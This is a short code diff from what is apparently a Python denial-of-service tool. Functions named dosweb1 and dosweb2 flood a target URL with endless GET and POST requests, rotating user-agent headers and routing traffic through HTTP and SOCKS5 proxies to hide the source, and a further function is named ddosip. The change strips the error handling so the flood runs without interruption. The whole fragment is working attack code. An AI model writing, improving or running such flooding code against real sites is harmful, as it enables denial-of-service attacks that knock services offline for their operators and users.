@@ -42,24 +42,18 @@ def dosweb1(target):
             'http': f'socks5://{proxyagentsocks}',
             'https': f'socks5://{proxyagentsocks}'
         }
-        try:
-            s.get(target, headers=header, proxies=proxieshttp)
-            s.post(target, headers=header, proxies=proxieshttp)
-            s.get(target, headers=header2, proxies=proxiessocks)
-            s.post(target, headers=header2, proxies=proxiessocks)
-        except requests.exceptions.ConnectionError:
-            print(colorama.Fore.RED + "[-] Connection error!")
+        s.get(target, headers=header, proxies=proxieshttp)
+        s.post(target, headers=header, proxies=proxieshttp)
+        s.get(target, headers=header2, proxies=proxiessocks)
+        s.post(target, headers=header2, proxies=proxiessocks)
 
 
 def dosweb2(target):
     while True:
         useragent = random.choice(headersp)
         header = {'user-agent': useragent}
-        try:
-            requests.get(target, headers=header)
-            requests.post(target, headers=header)
-        except requests.exceptions.ConnectionError:
-            print(colorama.Fore.RED + "[-] Connection error!")
+        requests.get(target, headers=header)
+        requests.post(target, headers=header)
 
 
 def ddosip():
